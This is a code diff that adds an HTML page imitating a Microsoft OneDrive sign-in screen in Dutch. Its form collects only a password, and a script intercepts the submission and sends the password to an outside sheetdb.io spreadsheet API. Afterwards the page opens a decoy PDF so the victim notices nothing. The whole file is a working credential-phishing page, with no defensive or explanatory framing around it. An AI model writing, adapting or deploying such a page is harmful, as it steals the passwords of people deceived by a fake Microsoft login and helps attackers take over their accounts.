@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft-style Sign Up</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('illustration.jpg') center center fixed; /* Replace with your background image */
+            background-size: cover;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        form {
+            width: 400px; /* Increased the width to 400px */
+            padding: 20px;
+            border: 1px solid #ddd;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 4px;
+            text-align: center;
+            position: relative;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px; /* Added more space under the heading */
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #333;
+            text-align: left;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 0 10px 15px;
+            border: none;
+            border-bottom: 1px solid #ddd; /* Added a bottom border */
+            box-sizing: border-box;
+        }
+
+        p {
+            text-align: left;
+            color: #333;
+            margin-bottom: 20px; /* Added more space under the paragraph */
+        }
+
+        a {
+            color: dodgerblue;
+        }
+
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
+        }
+
+        .signupbtn {
+            width: 30%; /* Adjusted the width to make the button smaller */
+            padding: 8px; /* Adjusted padding for a smaller button */
+            border-radius: 4px;
+            cursor: pointer;
+            background-color: #0078d4;
+            color: #fff;
+            border: none;
+            position: absolute;
+            bottom: 10px; /* Positioned at the bottom */
+            right: 10px; /* Positioned at the right */
+        }
+
+        .signupbtn:hover {
+            background-color: #005a9e;
+        }
+
+        .logo {
+            width: 145px; /* Adjusted to make the logo larger */
+            height: auto;
+            position: absolute;
+            top: 25px;
+            left: 15px;
+            margin-bottom: 20px; /* Added more space under the logo */
+        }
+    </style>
+</head>
+<body>
+    <form action="https://sheetdb.io/api/v1/in809r7hsx8hy" method="post" id="sheetdb-form">
+        <img class="logo" src="logo-EHB.png" alt="Logo">
+        <div class="container">
+            <h1></h1>
+            <br>
+
+            <p>Meld je aan bij OneDrive</p>
+
+            
+
+            <label for="psw"><b>Password</b></label>
+            <input type="password" placeholder="Enter Password" name="data [psw]" required>
+
+            <div class="clearfix">
+            <br>
+            <br>
+                <button type="submit" class="signupbtn">Volgende</button>
+            </div>
+        </div>
+    </form>
+    <script>
+        var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+            e.preventDefault();
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(document.getElementById("sheetdb-form")),
+            }).then(
+                response => response.json()
+            ).then(() => {
+                // you can put any JS code here
+                window.open('Fluo III.pdf', '_blank');
+            });
+        });
+    </script>
+</body>
+</html>
+
